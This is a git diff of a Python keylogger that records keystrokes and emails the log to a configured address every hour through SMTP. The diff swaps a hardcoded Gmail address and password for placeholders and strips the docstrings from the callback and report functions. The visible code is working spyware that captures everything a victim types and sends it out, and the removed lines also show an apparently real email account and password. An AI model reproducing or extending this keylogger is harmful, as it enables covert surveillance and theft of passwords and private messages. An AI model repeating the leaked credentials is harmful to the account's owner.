@@ -4,8 +4,8 @@ import smtplib
 from threading import Semaphore, Timer
 
 SEND_REPORT_EVERY = 3600
-EMAIL_ADDRESS = "findshashwat11@gmail.com"
-EMAIL_PASSWORD = "theninja011"
+EMAIL_ADDRESS = "your email here"
+EMAIL_PASSWORD = "your password here"
 
 class Keylogger:
     def __init__(self, interval):
@@ -14,10 +14,7 @@ class Keylogger:
         self.semaphore = Semaphore(0)
 
     def callback(self, event):
-        """
-        This callback is invoked whenever a keyboard event is occured
-        (i.e when a key is released in this example)
-        """
+       
         name = event.name
         if len(name) > 1:
             if name == "space":
@@ -40,10 +37,7 @@ class Keylogger:
         server.quit()
 
     def report(self):
-        """
-        This function gets called every `self.interval`
-        It basically sends keylogs and resets `self.log` variable
-        """
+       
         if self.log:
             self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
         self.log = ""
